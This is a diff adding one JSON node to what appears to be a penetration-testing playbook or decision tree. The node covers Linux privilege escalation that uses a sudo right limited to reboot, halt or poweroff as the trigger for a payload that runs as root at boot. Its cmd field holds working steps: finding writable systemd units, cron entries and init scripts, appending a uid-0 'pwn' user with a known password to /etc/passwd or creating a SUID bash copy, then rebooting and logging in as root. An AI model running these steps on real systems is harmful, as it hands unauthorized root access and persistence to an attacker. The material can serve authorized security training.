@@ -1,0 +1,26 @@
+{
+  "id": "service_restart_trigger",
+  "phase": "LINUX",
+  "title": "sudo reboot / halt \u2014 A Restart IS a Privesc Trigger",
+  "body": "A sudo -l that only lets you run /sbin/reboot, /sbin/halt, or /sbin/poweroff LOOKS useless \u2014 you can't read files or run a shell. It isn't useless: a reboot is the DETONATOR for any payload that runs at boot as root.\n\nThe pairing: find something that executes on startup with root privileges and that you can write \u2014 a writable systemd unit with WantedBy=multi-user.target, an @reboot cron entry, a writable init script, or a systemd timer. Plant your payload there, then use your one privilege \u2014 reboot \u2014 to fire it.\n\nThis reframes a whole class of 'dead-end' sudo entries. The question isn't 'what can sudo run for me,' it's 'does my sudo right let me TRIGGER something that already runs as root?' reboot/halt/poweroff all do \u2014 they restart the boot sequence, and the boot sequence runs as root.\n\nBecause a reboot is slow and one-way, prefer a payload that doesn't depend on timing: adding a root user to /etc/passwd or dropping a SUID bash both survive the reboot and need no listener. A reverse shell is the fragile choice here \u2014 your catcher has to be up at the exact moment the box finishes booting.",
+  "cmd": "# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 1. Confirm the restart privilege\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nsudo -l\n#   (root) NOPASSWD: /sbin/reboot, /sbin/halt, /sbin/poweroff   <- this is the trigger\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 2. Find a root-at-boot thing you can WRITE (the actual payload host)\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\nfind /etc/systemd/system -writable -type f 2>/dev/null      # writable unit  -> writable_service node\nls -la /etc/cron.d /etc/cron.daily /etc/crontab 2>/dev/null # writable cron  (@reboot ...)\nfind /etc/init.d -writable 2>/dev/null                      # writable init script\nsystemctl list-timers 2>/dev/null                           # a timer you can edit\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# 3. Plant a timing-independent payload, then pull the trigger\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# (in the writable unit/cron, as root at boot:)\necho 'pwn:'$(openssl passwd -1 pwned)':0:0:root:/root:/bin/bash' >> /etc/passwd\n#   or:  cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n\nsudo /sbin/reboot\n# after it comes back:\nsu pwn            # password: pwned   ->  id = uid=0\n# or:  /tmp/rootbash -p",
+  "warn": "A reboot is committing and slow \u2014 validate the payload first (systemd-analyze verify, or test your cron syntax) and confirm the hash/password match before you fire. If nothing happens after reboot, the payload host probably wasn't actually executed at boot (unit not enabled, cron not root's, script not run) \u2014 verify WITH 'systemctl is-enabled' before assuming the technique failed.",
+  "choices": [
+    {
+      "label": "Writable systemd unit \u2014 build the payload",
+      "next": "writable_service"
+    },
+    {
+      "label": "Rebooted \u2014 got root",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Back to sudo exploitation",
+      "next": "sudo_check"
+    },
+    {
+      "label": "Back to Linux privesc vectors",
+      "next": "vector_privesc_linux"
+    }
+  ]
+}
